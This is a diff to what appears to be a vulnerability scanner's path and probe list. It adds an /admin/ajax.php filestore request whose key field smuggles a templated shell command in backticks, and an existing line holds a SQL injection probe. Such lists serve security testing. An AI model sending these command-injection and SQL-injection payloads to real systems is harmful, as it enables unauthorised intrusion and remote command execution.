@@ -493,3 +493,5 @@
 /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5({{num}}))
 /displays/nuclei_check.json
 /wp-content/plugins/email-subscribers/readme.txt
+/admin/config.php
+/admin/ajax.php?module=filestore&command=testconnection&driver=SSH&host=127.0.0.1&user={{prefix}}&port=22&key={{prefix}}`{{cmd}}`&path={{prefix}}
